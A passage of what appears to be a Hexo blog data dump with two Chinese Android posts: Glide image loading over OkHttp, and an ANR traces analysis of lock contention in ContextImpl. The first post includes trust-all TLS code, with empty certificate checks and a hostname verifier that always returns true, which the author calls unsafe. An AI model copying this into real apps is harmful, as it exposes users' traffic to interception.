com.bumptech.glide.module.GlideModule</span><br><span class=\"line\">-keep public class * extends com.bumptech.glide.module.AppGlideModule</span><br><span class=\"line\">-keep public enum com.bumptech.glide.load.ImageHeaderParser$** &#123;</span><br><span class=\"line\">  **[] $VALUES;</span><br><span class=\"line\">  public *;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>配置完了记得Sync一下项目，接着新建一个AppGlideModule的子类，用我们现有的HttpClient来替换Glide的，很简单，这里把import的包也指明，方便对照：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> android.content.Context;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.support.annotation.NonNull;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.Glide;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.Registry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.annotation.GlideModule;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.integration.okhttp3.OkHttpUrlLoader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.load.model.GlideUrl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.<span class=\"keyword\">module</span>.AppGlideModule;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 注意这个注解一定要加上，HttpGlideModule是自定义的名字</span></span><br><span class=\"line\"><span class=\"meta\">@GlideModule</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">HttpGlideModule</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppGlideModule</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">registerComponents</span><span class=\"params\">(<span class=\"meta\">@NonNull</span> Context context, <span class=\"meta\">@NonNull</span> Glide glide, <span class=\"meta\">@NonNull</span> Registry registry)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 注意这里用我们刚才现有的Client实例传入即可</span></span><br><span class=\"line\">        registry.replace(GlideUrl.class, InputStream.class, <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpUrlLoader</span>.Factory(XXX.getHttpClient()));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>OK，现在再用Glide去加载图片，就是走的OkHttpClient了，可以添加log拦截器去看，这里就不赘述了。</p>\n<h4 id=\"问题2：忽略安全证书加载https图片\"><a href=\"#问题2：忽略安全证书加载https图片\" class=\"headerlink\" title=\"问题2：忽略安全证书加载https图片\"></a>问题2：忽略安全证书加载https图片</h4><p>主要是通过给OkHttp增加SSL和验证器配置来实现忽略安全认证，即便是自己签名证书的https域名也可以加载了。<br>先定义好SSLSocketFactory和HostnameVerifier：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * getSSLSocketFactory、getTrustManagers、getHostnameVerifier</span></span><br><span class=\"line\"><span class=\"comment\"> * 使OkHttpClient支持自签名证书，避免Glide加载不了Https图片</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> SSLSocketFactory <span class=\"title function_\">getSSLSocketFactory</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">SSLContext</span> <span class=\"variable\">sslContext</span> <span class=\"operator\">=</span> SSLContext.getInstance(<span class=\"string\">&quot;SSL&quot;</span>);</span><br><span class=\"line\">        sslContext.init(<span class=\"literal\">null</span>, getTrustManagers(), <span class=\"keyword\">new</span> <span class=\"title class_\">SecureRandom</span>());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sslContext.getSocketFactory();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RuntimeException</span>(e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> TrustManager[] getTrustManagers() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TrustManager</span>[]&#123;<span class=\"keyword\">new</span> <span class=\"title class_\">X509TrustManager</span>() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkClientTrusted</span><span class=\"params\">(X509Certificate[] chain, String authType)</span> &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkServerTrusted</span><span class=\"params\">(X509Certificate[] chain, String authType)</span> &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">X509Certificate</span>[]&#123;&#125;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> HostnameVerifier <span class=\"title function_\">getHostnameVerifier</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HostnameVerifier</span>() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">verify</span><span class=\"params\">(String hostname, SSLSession session)</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>; <span class=\"comment\">// 直接返回true，默认verify通过</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后回到最开始的初始化OkHttp代码，添加：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 简化示意的初始化代码</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> OkHttpClient <span class=\"title function_\">getHttpClient</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    OkHttpClient.<span class=\"type\">Builder</span> <span class=\"variable\">builder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">            ...</span><br><span class=\"line\">            .sslSocketFactory(getSSLSocketFactory())</span><br><span class=\"line\">            .hostnameVerifier(getHostnameVerifier())；</span><br><span class=\"line\">    <span class=\"keyword\">return</span> builder.build();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>大功告成了，虽然这样不是很安全的做法，但对于一些小项目或者测试环境来说，这能避免证书带来的无法加载网络图片的额外问题。</p>\n"},{"layout":"post","title":"源码茶舍之由一次简单的ANR分析深入了解Context","subtitle":"品味AOSP。","date":"2019-02-22T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> ANR是Android的老大难了，关于这方面的基础知识和深入好文都非常多，大家不妨谷歌一下。\n> 最近搭载骁龙855的小米9也发布了，移动平台的设备性能越来越强，许多App大多时候其实都吃不完那么多计算资源。\n> 说得可能不好听一点，很多烂代码要是在很多年前的手机上，本该导致卡顿（甚至是ANR）的，但由于如今强大的计算性能，卡顿几率大大减小了。从某方面来说增大了程序的容错，同时也掩盖了程序本身的缺陷。\n\n今天的题目关键词是“简单分析”和“深入了解”，哈哈，可能对于大佬们来说这些内容并不深入，所以我措辞为“了解”，望轻喷。\n\n## 分析traces文件\n\n前段时间，业务质量平台报上来很多ANR，我是一看就头疼呀！每次心里都犯嘀咕，我怎么就从来没遇到ANR呢？你们到底是怎么使用的。\n吐槽归吐槽，问题还是要解决的，Android的系统日志打包上来一般都会有traces.txt文件（还有event log等等，这里给大家硬广一下我另一篇[使用可视化的ChkBugreport分析log文件](https://blog.csdn.net/ysy950803/article/details/83214432)），也是我们分析这类问题的入口，里面记录了各个应用进程和系统进程的函数堆栈信息。于是乎，抓一份来瞧瞧：\n\n```\n\"main\" prio=5 tid=1 Blocked\ngroup=\"main\" sCount=1 dsCount=0 obj=0x75afba88 self=0x7fb0e96a00\n...\nat android.app.ContextImpl.getPreferencesDir(ContextImpl.java:483)\n- waiting to lock <0x0cfeaaf2> (a java.lang.Object) held by thread 24\nat android.app.ContextImpl.getSharedPreferencesPath(ContextImpl.java:665)\nat android.app.ContextImpl.getSharedPreferences(ContextImpl.java:364)\n- locked <0x09b0b543> (a java.lang.Class<android.app.ContextImpl>)\nat android.content.ContextWrapper.getSharedPreferences(ContextWrapper.java:174)\nat android.content.ContextWrapper.getSharedPreferences(ContextWrapper.java:174)\n...\nat com.xxx.receiver.xxx.onReceive(xxx.java:36)\n...\n```\n\n这里简单解释一下，ANR无非就是UI线程Block了，所以我们找到形如 \"main\" prio=5 tid=1 Blocked 这样的片段，main表示主线程，prio即priority，线程优先级（这里不是重点），tid就是thread的id，即线程id，最后标记了Blocked，表示线程阻塞了。\n接着的信息就是告诉你线程被哪个鬼lock了，关注这行：\n**waiting to lock <0x0cfeaaf2> (a java.lang.Object) held by thread 24**\n说明主线程的getPreferencesDir方法等着要去锁一个id为**0x0cfeaaf2**的Object类型的对象，但是被该死的tid=24的线程抢占了！让我来看看是谁，于是我们可以直接在traces文件里全局搜索0x0cfeaaf2或者tid=24这些字符串，锁定到如下日志：\n\n```\n\"PackageProcessor\" daemon prio=5 tid=24 Native\ngroup=\"main\" sCount=1 dsCount=0 obj=0x32c06af0 self=0x7fb0f36400\n...\nnative: #06 pc 0000000000862c18 /system/framework/arm64/boot-framework.oat (Java_android_os_BinderProxy_transactNative__ILandroid_os_Parcel_2Landroid_os_Parcel_2I+196)\nat android.os.BinderProxy.transactNative(Native method)\nat android.os.BinderProxy.transact(Binder.java:620)\nat android.os.storage.IMountService$Stub$Proxy.mkdirs(IMountService.java:870)\nat android.app.ContextImpl.ensureExternalDirsExistOrFilter(ContextImpl.java:2228)\nat android.app.ContextImpl.getExternalFilesDirs(ContextImpl.java:586)\n- locked <0x0cfeaaf2> (a java.lang.Object)\nat android.app.ContextImpl.getExternalFilesDir(ContextImpl.java:569)\nat android.content.ContextWrapper.getExternalFilesDir(ContextWrapper.java:243)\nat com.xxx.push.log.xxx.writeLog2File(xxx.java:100)\n...\n```\n\n这里很明显就看到了 **locked <0x0cfeaaf2> (a java.lang.Object)** ，某个和推送服务相关的writeLog2File方法调用了getExternalFilesDirs，然后此方法进一步锁住了 **0x0cfeaaf2** 对象，没错，**这个对象和刚才主线程等待要锁的对象是同一个。**\n所以主线程被tid=24的线程阻塞了，因为两个线程需要同一把对象锁，tid=24线程一直占着茅坑，导致死锁，ANR就这么爆出来了。\n\n## 了解Context\n\nContext是一个抽象类，ContextImpl是Context的实现类（具体一些继承关系可参考[Context都没弄明白，还怎么做Android开发？](https://www.jianshu.com/p/94e0f9ab3f1d)，某大佬写的，比较全面）。\n那么，上面的ANR我们重点关注的对象0x0cfeaaf2到底是谁呢？根据这一行：\n**at android.app.ContextImpl.getPreferencesDir(ContextImpl.java:483)**\n我们直接Read the fucking code，看看ContextImpl中这个方法在干啥：\n\n```java\n    private File getPreferencesDir() {\n        synchronized (mSync) {\n            if (mPreferencesDir == null) {\n                mPreferencesDir = new File(getDataDir(), \"shared_prefs\");\n            }\n            return ensurePrivateDirExists(mPreferencesDir);\n        }\n    }\n```\n\n可见，这里涉及到shared_prefs文件的IO操作，系统考虑到线程安全，搞了个同步锁，mSync对象被锁住。这个mSync就是我们刚才反复提到的id为0x0cfeaaf2的Object对象，去看看它的实例化就知晓了：\n\n```java\n    private final Object mSync = new Object();\n```\n\nprivate final，两个关键字合体了，说明这个成员是不可变的，而且是私有的，不准继承，即在Context的生命周期内全局只实例化一次，这样才能在加锁的时候保证唯一性。\n接下来又看刚才tid=24给对象加锁的方法，源码自然也在ContextImpl中：\n\n```java\n    @Override\n    public File[] getExternalFilesDirs(String type) {\n        synchronized (mSync) {\n            File[] dirs = Environment.buildExternalStorageAppFilesDirs(getPackageName());\n            if (type != null) {\n                dirs = Environment.buildPaths(dirs, type);\n            }\n            return ensureExternalDirsExistOrFilter(dirs);\n        }\n    }\n```\n\nOK，它也有给mSync加锁的操作， **所以tid=24线程的getExternalFilesDirs方法先加锁，造成主线程的getPreferencesDir方法抢不到这把锁，这真是喧宾夺主啊！** 你区区一个子线程和主线程作对，分析到此我们基本清楚了这次ANR是怎么来的了。\n这里我们进一步看看上面return的ensureExternalDirsExistOrFilter方法：\n\n```java\n    /**\n     * Ensure that given directories exist, trying to create them if missing. If\n     * unable to create, they are filtered by replacing with {@code null}.\n     */\n    private File[] ensureExternalDirsExistOrFilter(File[] dirs) {\n        final StorageManager sm = getSystemService(StorageManager.class);\n        final File[] result = new File[dirs.length];\n        for (int i = 0; i < dirs.length; i++) {\n            File dir = dirs[i];\n            if (!dir.exists()) {\n                if (!dir.mkdirs()) {\n                    // recheck existence in case of cross-process race\n                    if (!dir.exists()) {\n                        // Failing to mkdir() may be okay, since we might not have\n                        // enough permissions; ask vold to create on our behalf.\n                        try {\n                            sm.mkdirs(dir);\n                        } catch (Exception e) {\n                            Log.w(TAG, \"Failed to ensure \" + dir + \": \" + e);\n                            dir = null;\n                        }\n                    }\n                }\n            }\n            result[i] = dir;\n        }\n        return result;\n    }\n```\n\n我的天鸭，你看看，这操作多重啊，又是循环又是创建文件的，还有getSystemService这些系统服务对端调用，加在一起就是灰常耗时的操作，尤其是在文件目录极其散乱繁杂而且磁盘读写性能还不好的时候，此方法将进一步延长阻塞时间。\n\n我又一想，什么SP啊，DB啊，外部存储啊这些我们平时经常访问啊，也并不是那么容易就ANR的。也就是说虽然上面的系统方法操作很繁杂，但应该不是导致最终问题的核心因素。\n\n经过我反复分析traces文件，发现除了main线程在wait to lock这把锁，还有几个其它的子线程也在等待锁（有一些是访问App本地数据库的，最终调用也在ContextImpl中，和上面分析的两个方法类似）。说明当前这短暂的时间内，需要通过某个Context进行的IO操作太多了，各个线程都排着队要锁mSync，所以耗时操作不可怕，可怕的是一窝蜂全上来。自然就增大了ANR的风险。如果你反复遇到这种ANR，就应该考虑优化了。\n\n最终，追溯到方法调用的源头，是在Application初始化时，各种SDK加载，以及一些业务逻辑触发。很显然，它们都是通过getApplicationContext来拿到的同一个Context引用，请求锁的也是同一个mSync对象。\n\n## 结论与建议\n\n- 调用Context相关的IO操作，不是启个子线程就高枕无忧了，由上面分析，mSync对象锁就这么一把，该阻塞还是阻塞，和是不是主线程无关。\n- 尽量不要在Application的初始化时刻进行太多的方法调用，尤其是针对ApplicationContext的IO操作。\n- 在主Activity中延后初始化，用IntentService进行异步操作（因为实例化一个Service就是另一个Context对象了）等都是比较好的优化方案。\n- 所以为什么有大佬说不要滥用SharedPreference，它的性能并不是很好，从本文分析也可知它直接可能阻塞UI线程，试图寻找其它替代品吧。\n- 广播接收onReceive里面可以用goAsync异步处理，见：[goAsync帮你在onReceive中简便地进行异步操作](https://blog.csdn.net/ysy950803/article/details/83216891)。\n- ...想到再说，也欢迎大家补充。\n","source":"_posts/2019-02-23-源码茶舍之由一次简单的ANR分析深入了解Context.md","raw":"---\nlayout:     post\ntitle:      源码茶舍之由一次简单的ANR分析深入了解Context\nsubtitle:   品味AOSP。\ndate:       2019-02-23\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n> ANR是Android的老大难了，关于这方面的基础知识和深入好文都非常多，大家不妨谷歌一下。\n> 最近搭载骁龙855的小米9也发布了，移动平台的设备性能越来越强，许多App大多时候其实都吃不完那么多计算资源。\n> 说得可能不好听一点，很多烂代码要是在很多年前的手机上，本该导致卡顿（甚至是ANR）的，但由于如今强大的计算性能，卡顿几率大大减小了。从某方面来说增大了程序的容错，同时也掩盖了程序本身的缺陷。\n\n今天的题目关键词是“简单分析”和“深入了解”，哈哈，可能对于大佬们来说这些内容并不深入，所以我措辞为“了解”，望轻喷。\n\n## 分析traces文件\n\n前段时间，业务质量平台报上来很多ANR，我是一看就头疼呀！每次心里都犯嘀咕，我怎么就从来没遇到ANR呢？你们到底是怎么使用的。\n吐槽归吐槽，问题还是要解决的，Android的系统日志打包上来一般都会有traces.txt文件（还有event log等等，这里给大家硬广一下我另一篇[使用可视化的ChkBugreport分析log文件](https://blog.csdn.net/ysy950803/article/details/83214432)），也是我们分析这类问题的入口，里面记录了各个应用进程和系统进程的函数堆栈信息。于是乎，抓一份来瞧瞧：\n\n```\n\"main\" prio=5 tid=1 Blocked\ngroup=\"main\" sCount=1 dsCount=0 obj=0x75afba88 self=0x7fb0e96a00\n...\nat android.app.ContextImpl.getPreferencesDir(ContextImpl.java:483)\n- waiting to lock <0x0cfeaaf2> (a java.lang.Object) held by thread 24\nat android.app.ContextImpl.getSharedPreferencesPath(ContextImpl.java:665)\nat android.app.ContextImpl.getSharedPreferences(ContextImpl.java:364)\n- locked <0x09b0b543> (a java.lang.Class<android.app.ContextImpl>)\nat android.content.ContextWrapper.getSharedPreferences(ContextWrapper.java:174)\nat android.content.ContextWrapper.getSharedPreferences(ContextWrapper.java:174)\n...\nat com.xxx.receiver.xxx.onReceive(xxx.java:36)\n...\n```\n\n这里简单解释一下，ANR无非就是UI线程Block了，所以我们找到形如 \"main\" prio=5 tid=1 Blocked 这样的片段，main表示主线程，prio即priority，线程优先级（这里不是重点），tid就是thread的id，即线程id，最后标记了Blocked，表示线程阻塞了。\n接着的信息就是告诉你线程被哪个鬼lock了，关注这行：\n**waiting to lock <0x0cfeaaf2> (a java.lang.Object) held by thread 24**\n说明主线程的getPreferencesDir方法等着要去锁一个id为**0x0cfeaaf2**的Object类型的对象，但是被该死的tid=24的线程抢占了！让我来看看是谁，于是我们可以直接在traces文件里全局搜索0x0cfeaaf2或者tid=24这些字符串，锁定到如下日志：\n\n```\n\"PackageProcessor\" daemon prio=5 tid=24 Native\ngroup=\"main\" sCount=1 dsCount=0 obj=0x32c06af0 self=0x7fb0f36400\n...\nnative: #06 pc 0000000000862c18 /system/framework/arm64/boot-framework.oat (Java_android_os_BinderProxy_transactNative__ILandroid_os_Parcel_2Landroid_os_Parcel_2I+196)\nat android.os.BinderProxy.transactNative(Native method)\nat android.os.BinderProxy.transact(Binder.java:620)\nat android.os.storage.IMountService$Stub$Proxy.mkdirs(IMountService.java:870)\nat android.app.ContextImpl.ensureExternalDirsExistOrFilter(ContextImpl.java:2228)\nat android.app.ContextImpl.getExternalFilesDirs(ContextImpl.java:586)\n- locked <0x0cfeaaf2> (a java.lang.Object)\nat android.app.ContextImpl.getExternalFilesDir(ContextImpl.java:569)\nat android.content.ContextWrapper.getExternalFilesDir(ContextWrapper.java:243)\nat com.xxx.push.log.xxx.writeLog2File(xxx.java:100)\n...\n```\n\n这里很明显就看到了 **locked <0x0cfeaaf2> (a java.lang.Object)** ，某个和推送服务相关的writeLog2File方法调用了getExternalFilesDirs，然后此方法进一步锁住了 **0x0cfeaaf2** 对象，没错，**这个对象和刚才主线程等待要锁的对象是同一个。**\n所以主线程被tid=24的线程阻塞了，因为两个线程需要同一把对象锁，tid=24线程一直占着茅坑，导致死锁，ANR就这么爆出来了。\n\n## 了解Context\n\nContext是一个抽象类，ContextImpl是Context的实现类（具体一些继承关系可参考[Context都没弄明白，还怎么做Android开发？](https://www.jianshu.com/p/94e0f9ab3f1d)，某大佬写的，比较全面）。\n那么，上面的ANR我们重点关注的对象0x0cfeaaf2到底是谁呢？根据这一行：\n**at android.app.ContextImpl.getPreferencesDir(ContextImpl.java:483)**\n我们直接Read the fucking code，看看ContextImpl中这个方法在干啥：\n\n```java\n    private File getPreferencesDir() {\n        synchronized (mSync) {\n            if (mPreferencesDir == null) {\n                mPreferencesDir = new File(getDataDir(), \"shared_prefs\");\n            }\n            return ensurePrivateDirExists(mPreferencesDir);\n        }\n    }\n```\n\n可见，这里涉及到shared_prefs文件的IO操作，系统考虑到线程安全，搞了个同步锁，mSync对象被锁住。这个mSync就是我们刚才反复提到的id为0x0cfeaaf2的Object对象，去看看它的实例化就知晓了：\n\n```java\n    private final Object mSync = new Object();\n```\n\nprivate final，两个关键字合体了，说明这个成员是不可变的，而且是私有的，不准继承，即在Context的生命周期内全局只实例化一次，这样才能在加锁的时候保证唯一性。\n接下来又看刚才tid=24给对象加锁的方法，源码自然也在ContextImpl中：\n\n```java\n    @Override\n    public File[] getExternalFilesDirs(String type) {\n        synchronized (mSync) {\n            File[] dirs = Environment.buildExternalStorageAppFilesDirs(getPackageName());\n            if (type != null) {\n                dirs = Environment.buildPaths(dirs, type);\n            }\n            return ensureExternalDirsExistOrFilter(dirs);\n        }\n    }\n```\n\nOK，它也有给mSync加锁的操作， **所以tid=24线程的getExternalFilesDirs方法先加锁，造成主线程的getPreferencesDir方法抢不到这把锁，这真是喧宾夺主啊！** 你区区一个子线程和主线程作对，分析到此我们基本清楚了这次ANR是怎么来的了。\n这里我们进一步看看上面return的ensureExternalDirsExistOrFilter方法：\n\n```java\n    /**\n     * Ensure that given directories exist, trying to create them if missing. If\n     * unable to create, they are filtered by replacing with {@code null}.\n     */\n    private File[] ensureExternalDirsExistOrFilter(File[] dirs) {\n        final StorageManager sm = getSystemService(StorageManager.class);\n        final File[] result = new File[dirs.length];\n        for (int i = 0; i < dirs.length; i++) {\n            File dir = dirs[i];\n            if (!dir.exists()) {\n                if (!dir.mkdirs()) {\n                    // recheck existence in case of cross-process race\n                    if (!dir.exists()) {\n                        // Failing to mkdir() may be okay, since we might not have\n                        // enough permissions; ask vold to create on our behalf.\n                        try {\n                            sm.mkdirs(dir);\n                        } catch (Exception e) {\n                            Log.w(TAG, \"Failed to ensure \" + dir + \": \" + e);\n                            dir = null;\n                        }\n                    }\n                }\n            }\n            result[i] = dir;\n        }\n        return result;\n    }\n```\n\n我的天鸭，你看看，这操作多重啊，又是循环又是创建文件的，还有getSystemService这些系统服务对端调用，加在一起就是灰常耗时的操作，尤其是在文件目录极其散乱繁杂而且磁盘读写性能还不好的时候，此方法将进一步延长阻塞时间。\n\n我又一想，什么SP啊，DB啊，外部存储啊这些我们平时经常访问啊，也并不是那么容易就ANR的。也就是说虽然上面的系统方法操作很繁杂，但应该不是导致最终问题的核心因素。\n\n经过我反复分析traces文件，发现除了main线程在wait to lock这把锁，还有几个其它的子线程也在等待锁（有一些是访问App本地数据库的，最终调用也在ContextImpl中，和上面分析的两个方法类似）。说明当前这短暂的时间内，需要通过某个Context进行的IO操作太多了，各个线程都排着队要锁mSync，所以耗时操作不可怕，可怕的是一窝蜂全上来。自然就增大了ANR的风险。如果你反复遇到这种ANR，就应该考虑优化了。\n\n最终，追溯到方法调用的源头，是在Application初始化时，各种SDK加载，以及一些业务逻辑触发。很显然，它们都是通过getApplicationContext来拿到的同一个Context引用，请求锁的也是同一个mSync对象。\n\n## 结论与建议\n\n- 调用Context相关的IO操作，不是启个子线程就高枕无忧了，由上面分析，mSync对象锁就这么一把，该阻塞还是阻塞，和是不是主线程无关。\n- 尽量不要在Application的初始化时刻进行太多的方法调用，尤其是针对ApplicationContext的IO操作。\n- 在主Activity中延后初始化，用IntentService进行异步操作（因为实例化一个Service就是另一个Context对象了）等都是比较好的优化方案。\n- 所以为什么有大佬说不要滥用SharedPreference，它的性能并不是很好，从本文分析也可知它直接可能阻塞UI线程，试图寻找其它替代品吧。\n- 广播接收onReceive里面可以用goAsync异步处理，见：[goAsync帮你在onReceive中简便地进行异步操作](https://blog.csdn.net/ysy950803/article/details/83216891)。\n- ...想到再说，也欢迎大家补充。\n","slug":"源码茶舍之由一次简单的ANR分析深入了解Context","published":1,"updated":"2024-03-25T07:31:25.852Z","comments":1,"photos":[],"link":"","_id":"cluaufh0g000fthe6afamdbgn","content":"<blockquote>\n<p>ANR是Android的老大难了，关于这方面的基础知识和深入好文都非常多，大家不妨谷歌一下。<br>最近搭载骁龙855的小米9也发布了，移动平台的设备性能越来越强，许多App大多时候其实都吃不完那么多计算资源。<br>说得可能不好听一点，很多烂代码要是在很多年前的手机上，本该导致卡顿（甚至是ANR）的，但由于如今强大的计算性能，卡顿几率大大减小了。从某方面来说增大了程序的容错，同时也掩盖了程序本身的缺陷。</p>\n</blockquote>\n<p>今天的题目关键词是“简单分析”和“深入了解”，哈哈，可能对于大佬们来说这些内容并不深入，所以我措辞为“了解”，望轻喷。</p>\n<h2 id=\"分析traces文件\"><a href=\"#分析traces文件\" class=\"headerlink\" title=\"分析traces文件\"></a>分析traces文件</h2><p>前段时间，业务质量平台报上来很多ANR，我是一看就头疼呀！每次心里都犯嘀咕，我怎么就从来没遇到ANR呢？你们到底是怎么使用的。<br>吐槽归吐槽，问题还是要解决的，Android的系统日志打包上来一般都会有traces.txt文件（还有event log等等，这里给大家硬广一下我另一篇<a href=\"https://blog.csdn.net/ysy950803/article/details/83214432\">使用可视化的ChkBugreport分析log文件</a>），也是我们分析这类问题的入口，里面记录了各个应用进程和系统进程的函数堆栈信息。于是乎，抓一份来瞧瞧：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;main&quot; prio=5 tid=1 Blocked</span><br><span class=\"line\">group=&quot;main&quot; sCount=1 dsCount=0 obj=0x75afba88 self=0x7fb0e96a00</span><br><span class=\"line\">...</span><br><span class=\"line\">at android.app.ContextImpl.getPreferencesDir(ContextImpl.java:483)</span><br><span class=\"line\">- waiting to lock &lt;0x0cfeaaf2&gt; (a java.lang.Object) held by thread 24</span><br><span class=\"line\">at android.app.ContextImpl.getSharedPreferencesPath(ContextImpl.java:665)</span><br><span class=\"line\">at android.app.ContextImpl.getSharedPreferences(ContextImpl.java:364)</span><br><span class=\"line\">- locked &lt;0x09b0b543&gt; (a java.lang.Class&lt;android.app.ContextImpl&gt;)</span><br><span class=\"line\">at android.content.ContextWrapper.getSharedPreferences(ContextWrapper.java:174)</span><br><span class=\"line\">at android.content.ContextWrapper.getSharedPreferences(ContextWrapper.java:174)</span><br><span class=\"line\">...</span><br><span class=\"line\">at com.xxx.receiver.xxx.onReceive(xxx.java:36)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>这里简单解释一下，ANR无非就是UI线程Block了，所以我们找到形如 “main” prio&#x3D;5 tid&#x3D;1 